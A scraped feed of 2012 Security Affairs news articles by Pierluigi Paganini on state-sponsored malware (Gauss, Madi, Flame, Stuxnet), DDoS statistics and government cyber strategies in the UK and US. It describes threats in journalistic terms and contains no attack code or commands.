new malware for purposes of cyber espionage was once again identified by the Team of Kaspersky Lab. After Duqu, Flame and Mahdi a new cyber-espionage toolkit has been detected in the same region, the Middle East, and like its predecessor is capable of stealing sensitive data such as online banking credentials, browser passwords and system configurations.\n\nThe new agent has been named Gauss, after German mathematician Johann Carl Friedrich Gauss, and what is interesting is that it appears to linked to Stuxnet, the experts believe that it was produced with the same nation-state factories.\n\nGauss was discovered during investigation conducted by the International Telecommunication Union (ITU) to mitigate the risks posed by emerging cyber-threats.\n\nLooking in details the structure the malware appear composed by several modules have internal names which maybe pay tribute to famous mathematicians and philosophers, such as Kurt Godel, Johann Carl Friedrich Gauss and Joseph-Louis Lagrange. The core module that implements the data stealing capabilities is Gauss one.\n\n\n\n \n\n\n\nGauss has been detected thanks the investigation made to identify the Flame malware, according the investigations Gauss has been spread on September 2011 and was detected in June 2012 and on July it its command and control infrastructure shut down. What is interesting is that in the same period the CrySyS Lab in Hungary announced the discovery of Duqu. The Kaspersky researchers declared\n\nWe do not know if the people behind Duqu switched to Gauss at that time but we are quite sure they are related: Gauss is related to Flame, Flame is related to Stuxnet, Stuxnet is related to Duqu. Hence, Gauss is related to Duqu.\n\nKaspersky experts have found debugging info in some instances detected that provide details on the paths where the project resides and maybe on the real target of attacks that is considered Lebanon, first because the country registered a high rate of infections ( more than 1600 victims) and also because the term \u201cwhite\u201d in the debugging data.  According to Wikipedia, \u201cThe name Lebanon comes from the Semitic root LBN, meaning \u201cwhite\u201d, likely a reference to the snow-capped Mount Lebanon.\u201d\n\n \n\n\n\nThe shutting down of the C&C doesn\u2019t mean that the cyber threat has been definitively decapitated because is appears to be dormant waiting for server to become active.\n\nWhat is Gauss and which are its main targets?\n\nGauss is a cyber threat designed primary to monitor online banking accounts and as said major users affected are in the Middle East, the method of spreading is not yet determined, according to Kaspersky Gauss is a complex agent, surely nation-state sponsored cyber-espionage toolkit, that has a strong resemblances with Flame.\n\nThe \u2018Winshell.ocx\u2019 module which gives the name to the malware as \u2018Gauss\u2019, steals credentials required to access online banking accounts for several Lebanese banks such as Bank of Beirut, Byblos Bank and Fransabank. This is the first publicly known nation-state sponsored banking Trojan.\n\n\n\n\n\nKaspersky Lab\u2019s cloud-based security system has detected since late May 2012, more than 2,500 infections, that induce to think that probably being in tens of thousands the number of its victims, inferior to Stuxnet diffusion but higher than the number of attacks in Flame and Duqu.\n\nGauss collects data on victims with the intent to send it to attackers, those data con also include network interface information, BIOS characteristics  and computer drive details. It\u2019s infects USB sticks with a data stealing component that exploit the LNK (CVE-2010-2568) vulnerability, the same used by Stuxnet and Flame.\n\nAt the same time, the process of infecting USB sticks is more intelligent and efficient. Gauss is capable of \u201cdisinfecting\u201d the drive under certain circumstances, and uses the removable media to store collected information in a hidden file. The ability to collect information in a hidden file on USB drives exists in Flame as well\n\nThe malware also installs a special font called Palida Narrow \u2026 this circumstance is curious because last days I noted several tweets, apparently without meanings exchanged between members of Kaspersky team regarding a Palida Narrow theme.\n\n\n\nAt the moment experts ignore if the agent exploit also a zero-day vulnerability but are sure that Gauss\u2019 USB data stealing payload contains several encrypted sections which are decrypted with a key derived from certain system properties.What contains the encrypted payload? The researchers are still analyzing the contents of these mysterious encrypted blocks and trying to break the encryption scheme.\n\nThe discovery of Gauss let the experts believe that many other related cyber-espionage malware are actually in operation and many other will be developed in the next future.\n\nThat\u2019s is a way to make war, stealing sensible information to the enemies, in silence during long period, despite many experts doesn\u2019t consider it a cyber weapon in the strict sense, are in effect employed in military and government spying operation representing an irreplaceable and effective means of attack.\n\nMany ignore the aspect of modularity of this agents in the future may also receive supplementary modules, developed using also the  info acquired directly on the territories, to conduct attacks against critical infrastructures and centers of vital information.\n\nAs declared by the team of Kaspersky, \u201cThe current tensions in the Middle East are just signs of the intensity of these ongoing cyber-war and cyber-espionage campaigns.\u201d\n\nPierluigi Paganini\n\nReferences\n\nhttp://www.kaspersky.com/about/news/virus/2012/Kaspersky_Lab_and_ITU_Discover_Gauss_A_New_Complex_Cyber_Threat_Designed_to_Monitor_Online_Banking_Accounts\n\nhttp://www.securelist.com/en/analysis/204792238/Gauss_Abnormal_Distribution\n\nhttp://www.wired.com/threatlevel/2012/08/gauss-espionage-tool/\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-war", "topic_name": "cyber war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gauss", "topic_name": "Gauss"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mahdi", "topic_name": "Mahdi"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/zero-day-vulnerability", "topic_name": "zero-day vulnerability"}]}, {"news_name": "Malware & cyber espionage, ongoing attacks on sensitive information", "news_link": "https://securityaffairs.co/wordpress/7863/cyber-crime/malware-and-cyber-espionage-ongoing-attacks-on-our-sensitive-information.html", "title": "Malware & cyber espionage, ongoing attacks on sensitive information\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "August 2, 2012", "body": "Malware once were used primarily to destroy the victim\u2019s PC, but the scenario has completely changed today.\n\nWhile surviving the need of wanting to harm with malicious software, for example in the development of cyber weapons, the current trend is to develop agents that serve primarily to the function of spying.\n\nCybercrime, governments, and groups of hacktivists, with different purposes, tend to lean toward the spread of malicious agents that have the capacity to infiltrate the targets be silently stealing from them the most information. Profit, Power, Protest the main motivations behind the attacks, that are radically changing user\u2019s approach to the web and the their perception of security.\n\nWe usually blame China but recent events have shown that it is common practice to use malware with these purposes\n\nGoogle for example has detected a massive operation against performed by Chinese Hackers against several tens U.S. and multinational companies, but China is not the only nations involved in similar attacks, let\u2019s consider for example United States and researches to develop cyber weapon that are able to infiltrate sensitive networks to steal information. The project Olympic Games is the evidence of the effort spent in this new form of offense, and other valid examples of malware used with cyber espionage purpose are Duqu and Flame both developed to gather sensible information from Iranian Government.\n\nIt\u2019s true that most cyber operations of espionage traces back to China, but not all are related to government activities. According Joe Stewart, director of malware research at managed security provider Dell Secureworks,  many of them are conducted by private businesses.\n\n\u201cThe victims are, by and large, in Asia,\u201d he said. \u201cBut China is absolutely attacking everyone. There are plenty of victims.\u201d\n\nA recent study on cyber-espionage has demonstrated that more than 200 families of malware have been designed and used to spy on government and corporate representatives.\n\nWe have assisted to the diffusion of new agents that works in botnet architectures, in similar way to the ones used by cybercrime for massive attacks, but that are specifically developed for selected targets that resulting to have a minor dimension.\n\nThe study reveals that more than 1,100 domain were used in the attacks, in particular the experts have traced the botnet used analyzing the traffic produced, the Sinkholing, a consolidated technique used by many security firms,\n\nSinkholing is a technique that researchers use to redirect the identification of the malicious C&C server to their own analysis server. With this methods researcher design a map of the botnet and of the control center identifying the type and numbers of final attacks.\n\nIn many cases when the malicious domains expires security company acquire them to continue the analysis posing as C&C servers. The study of Dell Secureworks demonstrated that the identified botnet have hit with multiple attacks Japanese targets in both private and business sectors.\n\nAttacks have the primary intent to steal classified information from government agencies or trade secrets from corporations and the situation could be extremely dangerous for the economy of a company and of the overall country.\n\nWith similar attacks governments and business try to reduce the technological gap with their competitors, it\u2019s clear how much diffused is the phenomenon.\n\nThe cybercrime is not watching, it has increased focus in targeting individuals and organizations of all sizes to steal financial information, in particular under pressure has made the small businesses too vulnerable to cyber attacks.\n\nThe Trend Micro has reported a sensible increase of focused attacks respect previous quarter (27%), around  142 million threats which were blocked from infecting small businesses but also large companies have been hit by the crime as happened for the IXSHE campaign.\n\nThe web is a jungle where it is increasingly difficult to defend our identity and resources. Rik Ferguson, director of security research and communication, Trend Micro declared:\n\n\u201cThe reason why criminals are focusing their attacks on stealing personal data is simple. It\u2019s the sheer volume of people working from multiple devices that leaves them vulnerable to attacks,\u201d\n\n\u201cWhile Trend Micro has been integral in working with authorities to break up a number of cybercriminal rings over the last year, these cybercriminals have acquired new techniques and tools from collaborating with one another to accelerate their \u2018industry.\u2019 The fact is: business is booming for cybercrime and everyone needs to take notice.\u201d\n\nCyber espionage represents a serious cyber threat, and government agencies are defining best practices to reduce the risk of exposure to the attacks.\n\nNIST has recently released the public comment release of Draft Special Publication 800-83 (SP) Revision 1, Guide to Malware Incident Prevention and Handling for Desktops and Laptops.\n\nMalware is considered the most common external threat to most hosts, causing widespread damage and disruption and necessitating extensive recovery efforts within most organizations.\n\nThis publication provides recommendations for improving an organization\u2019s malware incident prevention measures.\n\nIt also gives extensive recommendations for enhancing an organization\u2019s existing incident response capability so that it is better prepared to handle malware incidents, particularly widespread ones.\n\nThe awareness  program sponsored by US government a good initiative to limit the diffusion of malicious agents a first and necessary step to protect our digital identities, our cyber space, our Nation.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/olympic-games", "topic_name": "'Olympic Games'"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivists", "topic_name": "hacktivists"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nist", "topic_name": "NIST"}]}, {"news_name": "South Korea, another data breach.

Alexander, who also heads the U.S. Cyber Command. \u201cIn this room right here is the talent our nation needs to secure cyberspace.\u201d\n\n\n\nThe message is clear, the hackers must be considered a National resource,  imagine how much is changed the consideration since the first 80\u2019s.\n\nHackers have a key role in the cyber strategies for homeland security and must be employed also in private industry to protect national business.\n\nAlexander remarked also the importance of awareness on the cyber security, the cyber war is not only a game for governments but has a dramatic impact on the economy and on the final citizen, hackers are right people to spread information on the subject:\n\n \u201cYou know that we can protect networks and have civil liberties and privacy; and you can help us get there.\u201d\n\nDuring the Aspen Security Forum conference on Thursday, Gen. Alexander revealed that there\u2019s been a 17 times increase in cyberattacks against U.S. infrastructure between 2009 and 2011 that\u2019s why the official added:\n\n\u201cSometimes you guys get a bad rap,\u201d he said. \u201cFrom my perspective, what you\u2019re doing to figure out vulnerabilities in our systems is great. We have to discover and fix those. You guys hold the line,\u201d\n\nUS, Israel, China, Russia all countries with a common intent, maintain their control over the cyberspace being prepared to cyber operations, both offensive and defensive, a goal possible with the creation of new cyber army composed by trained personnel and also hackers \u2026 we are facing with a call to cyber army.\n\nPierluigi Paganini\n\n \n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/crime-to-crime", "topic_name": "crime to crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-war", "topic_name": "cyber war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/date-breach", "topic_name": "date breach"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/defcon", "topic_name": "Defcon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacker", "topic_name": "hacker"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/kt-corp", "topic_name": "KT Corp"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}]}, {"news_name": "New Madi instance and \u201cAC/DC\u201d virus, Middle East as shooting range", "news_link": "https://securityaffairs.co/wordpress/7698/intelligence/new-madi-instance-and-acdc-virus-middle-east-as-shooting-range.html", "title": "New Madi instance and \u201cAC/DC\u201d virus, Middle East as shooting range\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 26, 2012", "body": "The Middle East has always been considered an area of the planet\u2019s turbulent for the continuing conflict and political tensions among the states that inhabit it. In the last two years, the tensions seem to have intensified and with it has grown the diffusion of malware for cyber espionage and for offensive purposes. In the eyes of the world time zero is represented by the spread of the virus Stuxnet developed by U.S. and widespread in Iran with the intent to interfere with the country\u2019s nuclear program.\n\nIn the following months there were findings of new malicious agents of unknown paternity that have hit the same area, we cannot forget the Duqu and the theory of the Tilded platform and also the Flame malware.\n\nBut every place in the world is attacked daily by malware, why we are discussing of Middle East?\n\nWell, in this area the number of malware that have been developed for state sponsored projects represent surely an anomaly. All the example provided are evidence of the intent of governments to hit its enemies in the cyber space to steal sensible information or to destroy their critical infrastructures.\n\nExactly one week ago thanks to the investigation of the team of Kaspersky lab and its partner Seculert firm have discovered an ongoing campaign to conduct a large scale infiltration of computer systems in the Middle East area. The campaign has targeted individuals across several states of the area such as Iran, Afghanistan and also Israel.\n\nThe operation discovered has been named \u201cMadi\u201d due the presence of certain strings used by the attackers.\n\nKaspersky Lab and Seculert have isolated the agents and identified the Madi Command & Control (C&C) servers, identifying more than 800 victims located in Middle East area and other select countries across the globe.\n\n\n\nThe Madi malware enables remote attackers to steal sensitive files from infected Windows computers, monitor all the activities of infected machines, first investigations suggest that multiple gigabytes of data have been stolen, according the experts  the campaign start seems dated at least 8 months.\n\nWhat\u2019s new in the last version detected?\n\nIt contains many interesting improvements and also new features. It now has the ability to monitor VKontakte, the major Russian social network, and it is also able to spy on Jabber conversation.\n\nThe malware is also able to work silently monitoring user navigation on specific web sites that contains specific keyworkds such as:\n\n\u201cgmail\u201d, \u201chotmail\u201d, \u201cyahoo! mail\u201d , \u201cgoogle+\u201d, \u201cmsn messenger\u201d, \u201cblogger\u201d, \u201cmassenger\u201d, \u201cprofile\u201d, \u201cicq\u201d , \u201cpaltalk\u201d, \u201cyahoo! messenger for the web\u201d,\u201dskype\u201d, \u201cfacebook\u201d ,\u201dimo\u201d, \u201cmeebo\u201d, \u201cstate\u201d , \u201cusa\u201d , \u201cu.s\u201d,\u201dcontact\u201d ,\u201dchat\u201d ,\u201dgov\u201d, \u201caol\u201d,\u201dhush\u201d,\u201dlive\u201d,\u201doovoo\u201d,\u201daim\u201d,\u201dmsn\u201d,\u201dtalk\u201d,\u201dsteam\u201d,\u201dvkontakte\u201d,\u201dhyves\u201d, \u201cmyspace\u201d,\u201djabber\u201d,\u201dshare\u201d,\u201doutlook\u201d,\u201dlotus\u201d,\u201dcareer\u201d\n\nOnce the agent notes that user visit one of the monitored sites it takes screenshots and  upload them to the control server.\n\nEven if the keylogger functionality is the same of the older version, new variant has various changes, the most meaningful is the behavior of the info stealer that no longer waits for \u201ccommands\u201d from the C2 instead, it simply uploads all stolen data to the control server right away.\n\nWhere are located the new command and control server?\n\nKaspersky team has localized them still in Montreal meanwhile previous servers were also located in Tehran.\n\nWell it\u2019s clear that operation are still continuing despite the discovery of the malware, the campaign has the unique intent to collect the largest amount of information possible.\n\nIt\u2019s not clear who is behind the attack but is evident that the campaign is state-sponsored with cyber espionage intents.\n\nBut as introduced in the title of the post the Middle East is becoming shooting range for malware diffusion, as mentioned I refer of course of state sponsored attacks that demonstrate the increasing interest in cyber warfare of governments.\n\n\n\nAnother news has recently alerted the international security community, a scientist working at the Atomic Energy Organisation of Iran (AEOI) declared that computer systems have been hit by a new cyber-attack.\n\nThis new attack is really singular because it forced computers to play AC/DC\u2019s Thunderstruck at full volume in the middle of the night.\n\nF-Secure was the first security firm informed of the attack, it has in fact received an  email from AEOI that recited:\n\n\u201cI am writing you to inform you that our nuclear program has once again been compromised and attacked by a new worm with exploits which have shut down our automation network at Natanz and another facility Fordo near Qom.\n\nAccording to the email our cyber experts sent to our teams, they believe a hacker tool Metasploit was used. The hackers had access to our VPN. The automation network and Siemens hardware were attacked and shut down. I only know very little about these cyber issues as I am scientist not a computer expert.\n\nThere was also some music playing randomly on several of the workstations during the middle of the night with the volume maxed out. I believe it was playing \u2018Thunderstruck\u2019 by AC/DC.\u201d\n\nWhy the attacker would have to make noise?\n\nI find only two simple explanations:\n\nThe diffusion of malware in the Middle East area must be considered a serious phenomenon for several reason, let\u2019s consider that cyberspace has no boundaries and the effect of a malware in not limited to a specific area, Stuxnet gives us a great example. Are we really ready to mitigate these cyber weapons escaped the control?\n\nFor sure we are still too vulnerable to consider ourselves at secure.\n\nSecond remarkable aspect is the risk that these agents could be reverse engineered to create new variant more aggressive starting from the original malware.\n\nThe operations could be performed by governments but don\u2019t forget the increasing phenomenon of cyber terrorism.\n\nAs stated several times we are in the middle of a cyber war!\n\nPierluigi Paganini\n\n \n\nReferences\n\nhttps://www.securelist.com/en/blog/208193696/Madi_is_back_New_Tricks_and_a_New_Command_Control_Server\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/acdc", "topic_name": "AC/DC"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/madi", "topic_name": "Madi"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/middle-east", "topic_name": "Middle East"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/virus", "topic_name": "virus"}]}, {"news_name": "DDoS attacks in Q2, do not underestimate the cyber threat", "news_link": "https://securityaffairs.co/wordpress/7527/cyber-crime/ddos-attacks-in-q2-do-not-underestimate-the-cyber-threat.html", "title": "DDoS attacks in Q2, do not underestimate the cyber threat\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 20, 2012", "body": "In the first quarter I proposed the results of an analysis conducted by Prolexic firm on the incidence of DDoS attacks.\n\nA DDoS attack represents a nightmare for all those all companies that provide web services that could be blocked by similar offensive, let\u2019s imagine the effect of a DDoS against a financial institution or against an e-commerce site of a great on-line store \u2026 no doubt the event is synonymous of loss of money.\n\nLet\u2019s consider also that DDoS attacks could be also used to block critical services, in a warfare scenario with this kind of attacks is possible to isolate a specific target or a vital service proceeding with other types of offensive.\n\nBut the DDoS is becoming famous also because it was a preferred mode of attack of group of hacktivists such as the famous Anonymous.\n\nProlexic is the world\u2019s largest and most trusted distributed denial of service (DDoS) mitigation service provider and have published the data related to DDoS attacks against its client occurred in Q2 2012.\n\nThe cyber threat has no boundaries and has hit all the sector of industry such as financial services, e-Commerce, SaaS, payment processing, travel/hospitality and gaming.\n\nWe learned that a DDoS attack could use different platforms and interesting several infrastructure layers, the detected events have mostly impacted Layer 3 and Layer 4. The Prolexis reports describes the phenomenon as a return to the past, when these layers were the most impacted and the attacks interested principally bandwidth capacity and routing infrastructure.\n\nInfrastructure attacks accounted for 81% of total attacks during the quarter with application layer attacks making up the remaining 19%, data in opposition with what has been observed in the three previous quarters.\n\nThe type of DDoS most used is SYN Flood but it has been also observed a new raise of UDP Floods mode.\n\n\n\nInteresting parameters for the qualification of a DDoS attack are the duration and Average attack speed. In Q2 2012 the average attack duration, compared with of the previous quarter data, is passed from 28,5 hours to 17 hours and also the average attack speed is decreased recording a speed of 4.4 Gbps and average packet-per-second (pps) volume totaled 2.7 million.\n\nAnalyzing in detail the number of attacks related to the quarter it\u2019s is anyway notice a reduction of the total number respect previous quarter, it\u2019s also possible observe that 47% of attacks has been registered on June, curiously concomitant opening of Euro 2012 soccer tournament, demonstrating that also sporting events have an impact on the internet security.\n\nWhich are the most active nations under the offensive perspective?\n\nThis quarter China confirmed its leadership in the chart of attack source country rankings with Thailand and the United States.\n\n\n\nIn the next months it is expected that the number of DDoS attacks will still increase also thanks the development of new tools and the diffusion of new botnets.\n\nThe report dedicates a specific session to a newer version of the Russkill bot also also known as Dirt Jumper, responsible for a sensible number of attacks, it seems that the author of the malware has released another DDoS toolkit that has similar structure and functionalities, named Pandora, that will give a sensible contribute in term of cyber attacks.\n\nConsider also that a sensible contribution to the growth of number of cyber attacks is also provided by the diffusion of botnet based on mobile devices.\n\nDespite this Quarter has registered a reduction of the total number of attacks the cyber threat is still very worrying, the total number of attacks doubled in Q2 2012 respect the same quarter one year ago \u2026 underestimate the threat could be very dangerous!\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnets", "topic_name": "Botnets"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mobile", "topic_name": "mobile"}]}, {"news_name": "UK cyber strategy discussed in ISC report 2011/2012", "news_link": "https://securityaffairs.co/wordpress/7484/cyber-crime/uk-cyber-strategy-discussed-in-isc-report-20112012.html", "title": "UK cyber strategy discussed in ISC report 2011/2012\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 19, 2012", "body": "The elaboration of a proper cyber strategy is one the main target of intelligence services all around the world. We often discuss of US and Israel, but also European governments are pushing to reinforce their presence in the cyber space. The fear of cyber attacks against critical infrastructures is high, it is a common strategy to identify all the possible cyber threats reducing the exposure to them.\n\nMany governments are also following an aggressive and dangerous approach, it\u2019s for example the case of UK that is evaluating the possibility to create a cyber weapon such as Stuxnet, to attack enemy states or to conduct sophisticated cyber espionage campaigns. My opinion is that every governments in the world is trying to develop similar weapons due their efficiency and also relative contained costs, we must consider also that a malware usage gives a great advantage to the attacker that could remain hidden for long time.\n\nThe opportunity to develop a cyber weapon ad to proceed with an aggressive strategy is contemplated in the \u201cIntelligence and Security Committee Annual Report 2011\u20132012\u201d report published last week, an important document that announces that Government had listed cyber security as a Tier One risk in the National Security Strategy.\n\n\n\nThe document confirms that cyber attacks are one of the main concerns of UK institutions, despite GCHQ and the other Agencies have made some progress in developing cyber capabilities, the nation still suffers cybercrime and continuous attacks from foreign governments.\n\nChina and Russia are the main countries that scares UK officials due their abilities in cyber espionage, but also emerging cyber terrorism represents a great concern.\n\nThe GCHQ estimates that approximately 80% of successful cyber attacks could be thwarted adopting opportune defense measures, following best practices and increasing collaboration between institutions and private businesses.\n\n\n\nThe report also provide data on suspected state sponsored attacks, GCHQ technical experts are convinced that around the 20% of cyber attacks have this origin and are characteriized by an high level of sophistication. The department in charge for Cyber Defence analysis if the Network Defence Intelligence and Security Team (NDIST) that detects and analyses each cyber offensive against the country to discover the vulnerabilities which are being exploited and apply the necessary counter measures.\n\nThe report alerts on a worrying phenomenon, the lack of progress since the publication of the National Cyber Security Programme (NCSP), a government program that announced the improvement of cyber capabilities by 2015 through special funding to the Agencies and other government departments.\n\nThe intelligence services will receive in fact over half of the \u00a3650m funding for the programme, in particular the main projects financed will be:\n\nIn GCHQ: to expand work on protective cyber security advice and information assurance; to improve the detection and analysis of cyber attacks including cyber crime; to consider intelligence operations in cyberspace; to improve cooperation with international allies and partners; and to work with the Ministry of Defence to set up a Joint Cyber Unit hosted at GCHQ to develop new tactics, techniques and plans to deliver military effects, including enhanced security, through cyberspace.\n\nIn SIS: to develop its role as an \u2018enabler\u2019 for GCHQ\u2019s cyber work.\n\nIn the Security Service: to develop and enhance its cyber section, in particular bringing together its cyber investigations and protective security work into a single team. Its work focuses on investigating cyber threats from hostile foreign intelligence services and working with UK victims. In addition, its protective security work has been broadened beyond the Critical National Infrastructure to include other priority areas of the UK private sector.\n\nOn the programme the ISC added:\n\n\u201cWhile attacks in cyberspace represent a significant threat to the UK, and defending against them must be a priority, we believe that there are also significant opportunities for our intelligence and security agencies and military which should be exploited in the interests of UK national security,\u201d\n\nIn November 2011, the UK Government presented its Cyber Security Strategy to be implemented within 2015 declaring the principal objectives to achive:\n\nThe Stuxnet case is a lesson for cyber security community, in particular are specimens the risks related to its escape in the wild. The spread of a so dangerous agent could further motivate hostile countries and independent hackers to attack the UK IT infrastructures. The uncontrolled spread of malware could also give the opportunity to cyber criminals to reverse engineer the source code of the virus to create new dangerous weapons.\n\nRichard Clayton, Cambridge University security expert, said\n\n\u201cA useful parallel is chemical and biological weapons,\u201d \u201cOnce you release it into the environment, it tends to hang around for a long time, and may blow back over your own troops.\u201d\n\u201cIt makes the world a bit more dangerous,\u201d Clayton said. \u201cA lot of people spent a lot of time pulling [Stuxnet] apart, and they may engineer what they find for less noble objectives.\u201d\n\nBritish intelligence is very interested on the usage of cyber-techniques to attack enemy governments in case of conflict, they are confident on the great destructive effects of cyber attacks.\n\nThe real issue is whether the UK are now able to cope with the consequences of a cyber aggressive policy, an active participation in the debate over the use of cyber weapon surely exhibits significantly the British government to a growing number of attacks.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-strategy", "topic_name": "cyber strategy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-terrorism", "topic_name": "cyber terrorism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/isc", "topic_name": "ISC"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/uk", "topic_name": "UK"}]}, {"news_name": "Government cyber strategies to mitigate growing cyber threats", "news_link": "https://securityaffairs.co/wordpress/7326/cyber-crime/government-cyber-strategies-to-mitigate-growing-cyber-threats.html", "title": "Government cyber strategies to mitigate growing cyber threats\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 16, 2012", "body": "In the last decade we have observed the raise of cyber attacks, no matter their purpose, cyber warfare or cyber espionage for military or private business, they have demonstrated how much dangerous is a cyber offensive.\n\nThe U.S.\u2019s leading cyberwarrior has estimated that private businesses are losing hundreds of billions to cyber espionage and cybercrimes, and the total expense to prevents those phenomena is increasing making companies less competitive in the causes of costs.\n\nThe main problem is to address this cyber threats with an appropriate cyber strategy first and after involving capable experts.\n\nThe question is continuously debated by the US high officials, four-star Gen. Keith Alexander, director of the secretive National Security Agency and head of the Pentagon\u2019s Cyber Command, declared recently that\n\nthe illicit cyberspace activities essentially amounted to \u201cthe greatest transfer of wealth in history.\u201d\n\nThe general alerted the US Government on an imminent dangerous for the national security, in a recent public intervention he said U.S. companies lose $250 billion to intellectual property theft every year.\n\n\n\nThe high official referred of data from Symantec and McAfee reports that show an alarming scenario, $114 billion was lost only due cybercrime activities, and the number could be as high as $388 billion if the value of time and business opportunities lost is included. In particular McAfee firm proposed worst data, today $1 trillion is spent globally in remediation.\n\nWhich are the main cyber threats that are arming governments?\n\nMalware and botnets represent the great challenge to security, according McAfee 75 million unique pieces of malware have been detected since now in their database, an amazing figure if we consider the related damage.\n\nSame concerns regarding the botnets and their diffusion, we are assisting to an evolution of the technology adopted, let\u2019s introduce for example the Peer-to-Peer based botnet, and the mechanism used for their diffusion.\n\nMany concerns are also related to the business model, malware as service or C2C, adopted by cybercrime that make possible the creation of botnet also for not experts.\n\nCybercrime is not only the unique concern of US Government, we must take in care of the increasing adoption of cyber operations made by foreign governments and also the hacktivism phenomenon.\n\nBoth are cyber threats, both could compromise national security, both could expose sensible information.\n\nDedicated chapter must be reserved for critical infrastructures, according the last ICS-CERT report the number of attacks is passed form 9 in 2009 to more than 160 in 2011, and the trend demonstrate a constant growth.\n\nHow Do governments prepare they army to the cyber war?\n\nOne of the main phenomena which we have witnessed is the recruitment of groups of hackers on the part of governments to carry out offensive actions but mainly to train their wards to new technical disciplines and the use of deadly new weapon \u2026 the keyboard.\n\nNo more bullets, but with such bits must battle and who better than a hacker can transfer their knowledge on the subject?\n\nThat\u2019s for example the approach followed by US that is trying to discover and hire most promising young hackers, U.S. Naval Postgraduate School professor John Arquilla said in an interview with The Guardian\n\n\u201cBut most of these sorts of guys can\u2019t be vetted in the traditional way. We need a new institutional culture that allows us to reach out to them.\u201d\n\nArquilla refers about 100 \u201cmaster hackers\u201d around the world, mainly in Asia and Russia, that could potentially break in every network.\n\nThese young forces represent the future for cyber army all over the world, and don\u2019t forget that their engage could be reserved also for the fight to cybercrime and cyber terrorism.\n\nBut the initiative proposed by Arquilla is not new, let\u2019s consider that China can count on specific projects and initiatives to recruit and form expert hackers to involve in cyber operations. PLA gives us an example on how important is the involving of young hackers in their 